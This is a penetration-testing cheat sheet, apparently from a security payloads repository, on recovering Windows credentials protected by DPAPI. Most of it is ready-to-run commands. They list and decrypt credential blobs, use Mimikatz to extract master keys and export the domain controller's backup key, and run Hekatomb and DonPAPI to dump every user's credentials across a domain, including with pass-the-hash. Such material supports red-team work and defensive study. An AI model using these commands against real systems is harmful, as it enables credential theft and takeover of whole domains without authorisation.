# Windows - DPAPI

> On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's Data Protection API and stored as "blob" files in user AppData folder.

## Summary

* [Data Protection API](#data-protection-api)
    * [List Credential Files](#list-credential-files)
    * [DPAPI LocalMachine Context](#dpapi-localmachine-context)
    * [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)
    * [Hekatomb - Steal all credentials on domain](#hekatomb---steal-all-credentials-on-domain)
    * [DonPAPI - Dumping DPAPI credz remotely](#donpapi---dumping-dpapi-credz-remotely)


## Data Protection API

* Outside of a domain: the user's `password hash` is used to encrypt these "blobs".
* Inside a domain: the `domain controller's master key` is used to encrypt these blobs.

With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the work  
stations in the domain.

```ps1
vaultcmd /list

VaultCmd /listcreds:<namevault>|<guidvault> /all
vaultcmd /listcreds:"Windows Credentials" /all
```

### List Credential Files

```ps1
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```


### DPAPI LocalMachine Context

The `LocalMachine` context is used to protect data that is intended to be shared across different users or services on a single machine. This means that any user or service running on the machine can access the protected data with the appropriate credentials.

In contrast, the `CurrentUser` context is used to protect data that is intended to be accessed only by the user who encrypted it, and cannot be accessed by other users or services on the same machine.

```ps1
$a = [System.Convert]::FromBase64String("AQAAANCMnd[...]")
$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
[System.Text.Encoding]::ASCII.GetString($b)
```


### Mimikatz - Credential Manager & DPAPI

```powershell
# check the folder to find credentials
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*

# check the file with mimikatz
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
# find master key
mimikatz !sekurlsa::dpapi
# use master key
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b

# find and export backup keys
lsadump::backupkeys /system:dc01.lab.local /export
# use backup keys
dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

### Hekatomb - Steal all credentials on domain

> [Processus-Thief/Hekatomb](https://github.com/Processus-Thief/HEKATOMB) is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.

```python
pip3 install hekatomb
hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp
```

![Data in memory](https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png)

### DonPAPI - Dumping DPAPI credz remotely

* [login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)

```ps1
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target

# using domain backup key
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
```

## References

* [DPAPI - Extracting Passwords - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
* [DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022](https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/)